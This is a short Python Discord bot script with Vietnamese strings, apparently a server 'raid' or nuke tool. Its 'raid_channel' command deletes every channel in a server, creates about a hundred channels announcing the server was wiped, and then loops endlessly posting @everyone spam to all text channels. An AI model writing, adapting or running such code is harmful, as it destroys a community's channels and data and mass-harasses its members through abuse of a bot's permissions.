import discord
from discord.ext import commands
import random
import asyncio


##########################################
prefixes = "-","="
client = commands.Bot(command_prefix = prefixes)
client.remove_command("help")
TOKEN = "Tự thêm"


###########################################
@client.event
async def on_ready():
    print(f'Bot {client.user.name} đã hoạt động')
    await client.wait_until_ready()
    sta = ['Magi Natsuki', '-help[-h]',f'Với {len(client.guilds)} máy chủ']
    while not client.is_closed():
        a = random.choice(sta)
        await client.change_presence(activity=discord.Streaming(name=a, url='https://www.twitch.tv/your_channel_here'))
        await asyncio.sleep(5)


@client.command()
async def raid_channel(ctx):
    số_lần = 0
    guild = ctx.guild
    for channel in guild.channels:
        await channel.delete()

    while số_lần <= 100:
        số_lần += 1
        await guild.create_text_channel('bạn đã bị bay server')

    if số_lần >= 100:
        while True:
            for c in ctx.guild.text_channels:
                await c.send("@everyone helo raid server cho mấy bạn vừa lòng")


##########################
client.run(TOKEN)
